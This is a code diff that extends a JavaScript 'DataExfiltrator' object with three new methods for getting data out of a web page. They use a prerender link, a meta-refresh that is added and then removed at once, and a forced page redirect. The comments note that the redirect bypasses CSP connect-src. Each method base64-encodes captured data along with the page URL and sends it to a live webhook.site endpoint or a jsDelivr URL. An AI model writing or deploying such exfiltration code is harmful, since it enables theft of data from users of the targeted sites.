@@ -481,7 +481,15 @@ const DataExfiltrator = {
             case 'image':
                 this.exfiltrateImage(data, nonce);
                 break;
-
+            case 'jsdelivr':
+                this.exfiltrateJsDelivr(data, nonce);
+                break;
+            case 'metarefresh':
+                this.exfiltrateMetaRefresh(data, nonce);
+                break;
+            case 'redirect':
+                this.exfiltrateRedirect(data);
+                break;
         }
     },
     
@@ -524,6 +532,58 @@ const DataExfiltrator = {
         console.log('🖼️ [EXFILL] Image exfiltration attempted with nonce');
     },
     
+    exfiltrateJsDelivr(data, nonce) {
+        // jsDelivr link-prerender exfiltration
+        if (!nonce) {
+            console.log('❌ [EXFILL] jsDelivr exfiltration failed - no nonce provided');
+            return;
+        }
+        const encoded = btoa(JSON.stringify(data));
+        const link = document.createElement('link');
+        link.rel = 'prerender';
+        link.href = `https://cdn.jsdelivr.net/link-prerender?data=${encoded}&page=${encodeURIComponent(location.href)}`;
+        link.setAttribute('nonce', nonce);
+        document.head.appendChild(link);
+        console.log('📦 [EXFILL] jsDelivr prerender exfiltration attempted');
+    },
+    
+    exfiltrateMetaRefresh(data, nonce) {
+        // Meta-refresh redirect exfiltration
+        if (!nonce) {
+            console.log('❌ [EXFILL] Meta-refresh exfiltration failed - no nonce provided');
+            return;
+        }
+        const encoded = btoa(JSON.stringify(data));
+        const meta = document.createElement('meta');
+        meta.setAttribute('http-equiv', 'refresh');
+        meta.setAttribute('content', `0;url=https://webhook.site/bf4a918f-96c6-407d-8ac3-92da9e493497/refresh?data=${encoded}&page=${encodeURIComponent(location.href)}`);
+        meta.setAttribute('nonce', nonce);
+        
+        // Add and immediately remove to trigger the request without actual redirect
+        document.head.appendChild(meta);
+        setTimeout(() => {
+            if (meta.parentNode) {
+                meta.parentNode.removeChild(meta);
+            }
+        }, 100);
+        
+        console.log('🔄 [EXFILL] Meta-refresh exfiltration attempted');
+    },
+    
+    exfiltrateRedirect(data) {
+        // Direct window.location.replace exfiltration - bypasses CSP connect-src
+        // WARNING: This will redirect the user away from the current page
+        const encoded = btoa(JSON.stringify(data));
+        const redirectUrl = `https://webhook.site/bf4a918f-96c6-407d-8ac3-92da9e493497/redirect?data=${encoded}&page=${encodeURIComponent(location.href)}`;
+        
+        console.log('🚨 [EXFILL] WARNING: About to redirect page for data exfiltration');
+        console.log('📤 [EXFILL] Redirect URL:', redirectUrl);
+        
+        // Give a brief moment for console logs to appear
+        setTimeout(() => {
+            window.location.replace(redirectUrl);
+        }, 500);
+    }
 
 };
 
